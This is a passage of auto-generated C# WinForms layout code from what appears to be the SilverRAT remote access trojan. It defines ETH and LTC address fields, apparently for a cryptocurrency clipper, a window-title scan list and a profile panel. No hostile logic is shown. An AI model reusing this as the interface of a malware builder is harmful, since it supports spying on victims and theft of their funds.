        stateProperties52.FillColor = System.Drawing.Color.White;
        stateProperties52.ForeColor = System.Drawing.Color.Empty;
        stateProperties52.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextETH.OnIdleState = stateProperties52;
        this.TextETH.Padding = new System.Windows.Forms.Padding(3);
        this.TextETH.PasswordChar = '\0';
        this.TextETH.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextETH.PlaceholderText = "ETH Address";
        this.TextETH.ReadOnly = false;
        this.TextETH.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextETH.SelectedText = "";
        this.TextETH.SelectionLength = 0;
        this.TextETH.SelectionStart = 0;
        this.TextETH.ShortcutsEnabled = true;
        this.TextETH.Size = new System.Drawing.Size(300, 28);
        this.TextETH.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextETH.TabIndex = 654;
        this.TextETH.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextETH.TextMarginBottom = 0;
        this.TextETH.TextMarginLeft = 3;
        this.TextETH.TextMarginTop = 1;
        this.TextETH.TextPlaceholder = "ETH Address";
        this.TextETH.UseSystemPasswordChar = false;
        this.TextETH.WordWrap = true;
        // 
        // TextLTC
        // 
        this.TextLTC.AcceptsReturn = false;
        this.TextLTC.AcceptsTab = false;
        this.TextLTC.AnimationSpeed = 200;
        this.TextLTC.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextLTC.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextLTC.AutoSizeHeight = true;
        this.TextLTC.BackColor = System.Drawing.Color.Transparent;
        this.TextLTC.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextLTC.BackgroundImage")));
        this.TextLTC.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextLTC.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextLTC.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextLTC.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextLTC.BorderRadius = 2;
        this.TextLTC.BorderThickness = 1;
        this.TextLTC.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextLTC.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextLTC.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextLTC.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextLTC.DefaultText = "";
        this.TextLTC.FillColor = System.Drawing.Color.White;
        this.TextLTC.HideSelection = true;
        this.TextLTC.IconLeft = null;
        this.TextLTC.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextLTC.IconPadding = 10;
        this.TextLTC.IconRight = null;
        this.TextLTC.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextLTC.Lines = new string[0];
        this.TextLTC.Location = new System.Drawing.Point(3, 75);
        this.TextLTC.MaxLength = 32767;
        this.TextLTC.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextLTC.Modified = false;
        this.TextLTC.Multiline = false;
        this.TextLTC.Name = "TextLTC";
        stateProperties53.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties53.FillColor = System.Drawing.Color.Empty;
        stateProperties53.ForeColor = System.Drawing.Color.Empty;
        stateProperties53.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextLTC.OnActiveState = stateProperties53;
        stateProperties54.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties54.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties54.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties54.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextLTC.OnDisabledState = stateProperties54;
        stateProperties55.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties55.FillColor = System.Drawing.Color.Empty;
        stateProperties55.ForeColor = System.Drawing.Color.Empty;
        stateProperties55.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextLTC.OnHoverState = stateProperties55;
        stateProperties56.BorderColor = System.Drawing.Color.Silver;
        stateProperties56.FillColor = System.Drawing.Color.White;
        stateProperties56.ForeColor = System.Drawing.Color.Empty;
        stateProperties56.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextLTC.OnIdleState = stateProperties56;
        this.TextLTC.Padding = new System.Windows.Forms.Padding(3);
        this.TextLTC.PasswordChar = '\0';
        this.TextLTC.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextLTC.PlaceholderText = "LTC Address";
        this.TextLTC.ReadOnly = false;
        this.TextLTC.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextLTC.SelectedText = "";
        this.TextLTC.SelectionLength = 0;
        this.TextLTC.SelectionStart = 0;
        this.TextLTC.ShortcutsEnabled = true;
        this.TextLTC.Size = new System.Drawing.Size(300, 28);
        this.TextLTC.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextLTC.TabIndex = 655;
        this.TextLTC.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextLTC.TextMarginBottom = 0;
        this.TextLTC.TextMarginLeft = 3;
        this.TextLTC.TextMarginTop = 1;
        this.TextLTC.TextPlaceholder = "LTC Address";
        this.TextLTC.UseSystemPasswordChar = false;
        this.TextLTC.WordWrap = true;
        // 
        // PanelListScan
        // 
        this.PanelListScan.Controls.Add(this.ListScanActiveAddresses);
        this.PanelListScan.Controls.Add(this.ScanTitle);
        this.PanelListScan.Location = new System.Drawing.Point(12, 304);
        this.PanelListScan.Name = "PanelListScan";
        this.PanelListScan.Size = new System.Drawing.Size(308, 195);
        this.PanelListScan.TabIndex = 667;
        // 
        // ListScanActiveAddresses
        // 
        this.ListScanActiveAddresses.AllowUserToAddRows = false;
        this.ListScanActiveAddresses.AllowUserToDeleteRows = false;
        this.ListScanActiveAddresses.AllowUserToResizeColumns = false;
        this.ListScanActiveAddresses.AllowUserToResizeRows = false;
        dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.ListScanActiveAddresses.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
        this.ListScanActiveAddresses.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.ListScanActiveAddresses.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListScanActiveAddresses.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListScanActiveAddresses.BackgroundColor = System.Drawing.Color.White;
        this.ListScanActiveAddresses.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListScanActiveAddresses.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListScanActiveAddresses.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListScanActiveAddresses.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListScanActiveAddresses.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListScanActiveAddresses.ColumnHeadersHeight = 30;
        this.ListScanActiveAddresses.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListScanActiveAddresses.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Column4});
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListScanActiveAddresses.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListScanActiveAddresses.EnableHeadersVisualStyles = false;
        this.ListScanActiveAddresses.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.ListScanActiveAddresses.Location = new System.Drawing.Point(5, 41);
        this.ListScanActiveAddresses.Name = "ListScanActiveAddresses";
        this.ListScanActiveAddresses.RowHeadersVisible = false;
        this.ListScanActiveAddresses.RowHeadersWidth = 27;
        this.ListScanActiveAddresses.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListScanActiveAddresses.ShowCellErrors = false;
        this.ListScanActiveAddresses.ShowEditingIcon = false;
        this.ListScanActiveAddresses.ShowRowErrors = false;
        this.ListScanActiveAddresses.Size = new System.Drawing.Size(298, 146);
        this.ListScanActiveAddresses.TabIndex = 660;
        this.ListScanActiveAddresses.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListScanActiveAddresses.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(247)))), ((int)(((byte)(248)))), ((int)(((byte)(249)))));
        this.ListScanActiveAddresses.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListScanActiveAddresses.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListScanActiveAddresses.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListScanActiveAddresses.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListScanActiveAddresses.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListScanActiveAddresses.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(244)))), ((int)(((byte)(245)))), ((int)(((byte)(247)))));
        this.ListScanActiveAddresses.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(234)))), ((int)(((byte)(237)))));
        this.ListScanActiveAddresses.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListScanActiveAddresses.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ListScanActiveAddresses.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListScanActiveAddresses.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListScanActiveAddresses.ThemeStyle.HeaderStyle.Height = 30;
        this.ListScanActiveAddresses.ThemeStyle.ReadOnly = false;
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5F);
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.Height = 22;
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ListScanActiveAddresses.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        // 
        // Column4
        // 
        this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column4.HeaderText = "Title";
        this.Column4.Name = "Column4";
        // 
        // ScanTitle
        // 
        this.ScanTitle.AcceptsReturn = false;
        this.ScanTitle.AcceptsTab = false;
        this.ScanTitle.AnimationSpeed = 200;
        this.ScanTitle.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.ScanTitle.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.ScanTitle.AutoSizeHeight = true;
        this.ScanTitle.BackColor = System.Drawing.Color.Transparent;
        this.ScanTitle.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ScanTitle.BackgroundImage")));
        this.ScanTitle.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScanTitle.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.ScanTitle.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ScanTitle.BorderColorIdle = System.Drawing.Color.Silver;
        this.ScanTitle.BorderRadius = 2;
        this.ScanTitle.BorderThickness = 1;
        this.ScanTitle.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.ScanTitle.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.ScanTitle.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.ScanTitle.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.ScanTitle.DefaultText = "";
        this.ScanTitle.FillColor = System.Drawing.Color.White;
        this.ScanTitle.HideSelection = true;
        this.ScanTitle.IconLeft = ((System.Drawing.Image)(resources.GetObject("ScanTitle.IconLeft")));
        this.ScanTitle.IconLeftCursor = System.Windows.Forms.Cursors.Hand;
        this.ScanTitle.IconPadding = 4;
        this.ScanTitle.IconRight = global::SilverRAT.Properties.Resources.IconAdd;
        this.ScanTitle.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.ScanTitle.Lines = new string[0];
        this.ScanTitle.Location = new System.Drawing.Point(3, 8);
        this.ScanTitle.MaxLength = 32767;
        this.ScanTitle.MinimumSize = new System.Drawing.Size(1, 1);
        this.ScanTitle.Modified = false;
        this.ScanTitle.Multiline = false;
        this.ScanTitle.Name = "ScanTitle";
        stateProperties57.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties57.FillColor = System.Drawing.Color.Empty;
        stateProperties57.ForeColor = System.Drawing.Color.Empty;
        stateProperties57.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScanTitle.OnActiveState = stateProperties57;
        stateProperties58.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties58.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties58.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties58.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.ScanTitle.OnDisabledState = stateProperties58;
        stateProperties59.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties59.FillColor = System.Drawing.Color.Empty;
        stateProperties59.ForeColor = System.Drawing.Color.Empty;
        stateProperties59.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScanTitle.OnHoverState = stateProperties59;
        stateProperties60.BorderColor = System.Drawing.Color.Silver;
        stateProperties60.FillColor = System.Drawing.Color.White;
        stateProperties60.ForeColor = System.Drawing.Color.Empty;
        stateProperties60.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.ScanTitle.OnIdleState = stateProperties60;
        this.ScanTitle.Padding = new System.Windows.Forms.Padding(3);
        this.ScanTitle.PasswordChar = '\0';
        this.ScanTitle.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.ScanTitle.PlaceholderText = "Title";
        this.ScanTitle.ReadOnly = false;
        this.ScanTitle.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.ScanTitle.SelectedText = "";
        this.ScanTitle.SelectionLength = 0;
        this.ScanTitle.SelectionStart = 0;
        this.ScanTitle.ShortcutsEnabled = true;
        this.ScanTitle.Size = new System.Drawing.Size(300, 28);
        this.ScanTitle.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.ScanTitle.TabIndex = 658;
        this.ScanTitle.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ScanTitle.TextMarginBottom = 0;
        this.ScanTitle.TextMarginLeft = 3;
        this.ScanTitle.TextMarginTop = 1;
        this.ScanTitle.TextPlaceholder = "Title";
        this.ScanTitle.UseSystemPasswordChar = false;
        this.ScanTitle.WordWrap = true;
        this.ScanTitle.OnIconLeftClick += new System.EventHandler(this.ScanTitle_OnIconLeftClick);
        this.ScanTitle.OnIconRightClick += new System.EventHandler(this.ScanTitle_OnIconRightClick);
        // 
        // TitleMuneMonitor
        // 
        this.TitleMuneMonitor.AllowParentOverrides = false;
        this.TitleMuneMonitor.AutoEllipsis = false;
        this.TitleMuneMonitor.AutoSize = false;
        this.TitleMuneMonitor.Cursor = System.Windows.Forms.Cursors.Default;
        this.TitleMuneMonitor.CursorType = System.Windows.Forms.Cursors.Default;
        this.TitleMuneMonitor.Dock = System.Windows.Forms.DockStyle.Top;
        this.TitleMuneMonitor.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.TitleMuneMonitor.ForeColor = System.Drawing.Color.Gray;
        this.TitleMuneMonitor.Location = new System.Drawing.Point(0, 0);
        this.TitleMuneMonitor.Name = "TitleMuneMonitor";
        this.TitleMuneMonitor.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitleMuneMonitor.Size = new System.Drawing.Size(334, 16);
        this.TitleMuneMonitor.TabIndex = 673;
        this.TitleMuneMonitor.Text = "...";
        this.TitleMuneMonitor.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.TitleMuneMonitor.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // tabPage3
        // 
        this.tabPage3.Controls.Add(this.PanelProfile);
        this.tabPage3.Location = new System.Drawing.Point(4, 4);
        this.tabPage3.Name = "tabPage3";
        this.tabPage3.Size = new System.Drawing.Size(340, 602);
        this.tabPage3.TabIndex = 2;
        this.tabPage3.Text = "tabPage3Account";
        this.tabPage3.UseVisualStyleBackColor = true;
        // 
        // PanelProfile
        // 
        this.PanelProfile.Controls.Add(this.MuneCloseProfile);
        this.PanelProfile.Controls.Add(this.TitleMuneProfile);
        this.PanelProfile.Controls.Add(this.bunifuPanel19);
        this.PanelProfile.Controls.Add(this.ProfileDate);
        this.PanelProfile.Controls.Add(this.BrowserLogo);
        this.PanelProfile.Controls.Add(this.LevelProfile);
        this.PanelProfile.Controls.Add(this.bunifuLabel_2);
        this.PanelProfile.Controls.Add(this.ProfileUsername);
        this.PanelProfile.Controls.Add(this.ImageProfileMune);
        this.PanelProfile.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelProfile.Location = new System.Drawing.Point(0, 0);
        this.PanelProfile.Name = "PanelProfile";
        this.PanelProfile.Size = new System.Drawing.Size(340, 602);
        this.PanelProfile.TabIndex = 602;
        // 
        // MuneCloseProfile
        // 
        this.MuneCloseProfile.Anchor = System.Windows.Forms.AnchorStyles.Top;
        this.MuneCloseProfile.AutoSize = true;
        this.MuneCloseProfile.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneCloseProfile.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.MuneCloseProfile.Location = new System.Drawing.Point(316, 8);
        this.MuneCloseProfile.Name = "MuneCloseProfile";
        this.MuneCloseProfile.Size = new System.Drawing.Size(16, 15);
        this.MuneCloseProfile.TabIndex = 671;
        this.MuneCloseProfile.Text = "X";
        this.MuneCloseProfile.Click += new System.EventHandler(this.MuneCloseProfile_Click);
        // 
        // TitleMuneProfile
        // 
        this.TitleMuneProfile.AllowParentOverrides = false;
        this.TitleMuneProfile.AutoEllipsis = false;
        this.TitleMuneProfile.AutoSize = false;
        this.TitleMuneProfile.Cursor = System.Windows.Forms.Cursors.Default;
        this.TitleMuneProfile.CursorType = System.Windows.Forms.Cursors.Default;
        this.TitleMuneProfile.Dock = System.Windows.Forms.DockStyle.Top;
        this.TitleMuneProfile.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.TitleMuneProfile.ForeColor = System.Drawing.Color.Gray;
        this.TitleMuneProfile.Location = new System.Drawing.Point(0, 0);
        this.TitleMuneProfile.Name = "TitleMuneProfile";
        this.TitleMuneProfile.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitleMuneProfile.Size = new System.Drawing.Size(340, 17);
        this.TitleMuneProfile.TabIndex = 670;
        this.TitleMuneProfile.Text = "...";
        this.TitleMuneProfile.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.TitleMuneProfile.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // bunifuPanel19
        // 
        this.bunifuPanel19.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)));
        this.bunifuPanel19.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(205)))), ((int)(((byte)(11)))));
        this.bunifuPanel19.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("bunifuPanel19.BackgroundImage")));
        this.bunifuPanel19.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.bunifuPanel19.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(205)))), ((int)(((byte)(11)))));
        this.bunifuPanel19.BorderRadius = 30;
        this.bunifuPanel19.BorderThickness = 1;
        this.bunifuPanel19.Controls.Add(this.ImageMuneGood);
        this.bunifuPanel19.Controls.Add(this.ImageMuneError);
        this.bunifuPanel19.Controls.Add(this.guna2Button3);
        this.bunifuPanel19.Controls.Add(this.guna2Button2);
        this.bunifuPanel19.Controls.Add(this.guna2Button1);
        this.bunifuPanel19.Controls.Add(this.bunifuLabel74);
        this.bunifuPanel19.Controls.Add(this.bunifuLabel67);
        this.bunifuPanel19.Controls.Add(this.ValueMunePerformince);
        this.bunifuPanel19.Controls.Add(this.bunifuLabel71);
        this.bunifuPanel19.Location = new System.Drawing.Point(54, 294);
        this.bunifuPanel19.Name = "bunifuPanel19";
        this.bunifuPanel19.ShowBorders = true;
        this.bunifuPanel19.Size = new System.Drawing.Size(240, 291);
        this.bunifuPanel19.TabIndex = 595;
        // 
        // ImageMuneGood
        // 
        this.ImageMuneGood.Anchor = System.Windows.Forms.AnchorStyles.Top;
        this.ImageMuneGood.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(205)))), ((int)(((byte)(11)))));
        this.ImageMuneGood.Image = ((System.Drawing.Image)(resources.GetObject("ImageMuneGood.Image")));
        this.ImageMuneGood.Location = new System.Drawing.Point(19, 71);
        this.ImageMuneGood.Name = "ImageMuneGood";
        this.ImageMuneGood.Size = new System.Drawing.Size(199, 47);
        this.ImageMuneGood.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageMuneGood.TabIndex = 651;
        this.ImageMuneGood.TabStop = false;
        this.ImageMuneGood.Visible = false;
        // 
        // ImageMuneError
        // 
        this.ImageMuneError.Anchor = System.Windows.Forms.AnchorStyles.Top;
        this.ImageMuneError.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(249)))), ((int)(((byte)(205)))), ((int)(((byte)(11)))));
        this.ImageMuneError.Image = ((System.Drawing.Image)(resources.GetObject("ImageMuneError.Image")));
        this.ImageMuneError.Location = new System.Drawing.Point(19, 71);
        this.ImageMuneError.Name = "ImageMuneError";
        this.ImageMuneError.Size = new System.Drawing.Size(199, 47);
        this.ImageMuneError.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageMuneError.TabIndex = 650;
        this.ImageMuneError.TabStop = false;
        this.ImageMuneError.Visible = false;
        // 
        // guna2Button3
        // 
        this.guna2Button3.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
        this.guna2Button3.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button3.BorderRadius = 5;
        this.guna2Button3.CheckedState.Parent = this.guna2Button3;
        this.guna2Button3.CustomImages.Parent = this.guna2Button3;
        this.guna2Button3.FillColor = System.Drawing.SystemColors.HotTrack;
        this.guna2Button3.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.guna2Button3.ForeColor = System.Drawing.Color.White;
        this.guna2Button3.HoverState.Parent = this.guna2Button3;
        this.guna2Button3.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button3.Image")));
        this.guna2Button3.Location = new System.Drawing.Point(167, 243);
        this.guna2Button3.Name = "guna2Button3";
        this.guna2Button3.ShadowDecoration.Parent = this.guna2Button3;
        this.guna2Button3.Size = new System.Drawing.Size(42, 34);
        this.guna2Button3.TabIndex = 585;
        // 
        // guna2Button2
        // 
        this.guna2Button2.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
        this.guna2Button2.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button2.BorderRadius = 5;
        this.guna2Button2.CheckedState.Parent = this.guna2Button2;
        this.guna2Button2.CustomImages.Parent = this.guna2Button2;
        this.guna2Button2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(254)))), ((int)(((byte)(64)))), ((int)(((byte)(48)))));
        this.guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.guna2Button2.ForeColor = System.Drawing.Color.White;
        this.guna2Button2.HoverState.Parent = this.guna2Button2;
        this.guna2Button2.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button2.Image")));
        this.guna2Button2.ImageSize = new System.Drawing.Size(22, 22);
        this.guna2Button2.Location = new System.Drawing.Point(103, 243);
        this.guna2Button2.Name = "guna2Button2";
        this.guna2Button2.ShadowDecoration.Parent = this.guna2Button2;
        this.guna2Button2.Size = new System.Drawing.Size(42, 34);
        this.guna2Button2.TabIndex = 584;
        // 
        // guna2Button1
        // 
        this.guna2Button1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
        this.guna2Button1.BackColor = System.Drawing.Color.Transparent;
        this.guna2Button1.BorderRadius = 5;
        this.guna2Button1.CheckedState.Parent = this.guna2Button1;
        this.guna2Button1.CustomImages.Parent = this.guna2Button1;
        this.guna2Button1.FillColor = System.Drawing.Color.DarkMagenta;
        this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.guna2Button1.ForeColor = System.Drawing.Color.White;
        this.guna2Button1.HoverState.Parent = this.guna2Button1;
        this.guna2Button1.Image = ((System.Drawing.Image)(resources.GetObject("guna2Button1.Image")));
        this.guna2Button1.ImageSize = new System.Drawing.Size(22, 22);
        this.guna2Button1.Location = new System.Drawing.Point(39, 243);
        this.guna2Button1.Name = "guna2Button1";
        this.guna2Button1.ShadowDecoration.Parent = this.guna2Button1;
        this.guna2Button1.Size = new System.Drawing.Size(43, 34);
        this.guna2Button1.TabIndex = 583;
        // 
        // bunifuLabel74
        // 
        this.bunifuLabel74.AllowParentOverrides = false;
        this.bunifuLabel74.AutoEllipsis = false;
        this.bunifuLabel74.AutoSize = false;
        this.bunifuLabel74.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel74.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel74.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.bunifuLabel74.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel74.Location = new System.Drawing.Point(16, 35);
        this.bunifuLabel74.Name = "bunifuLabel74";
        this.bunifuLabel74.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel74.Size = new System.Drawing.Size(213, 38);
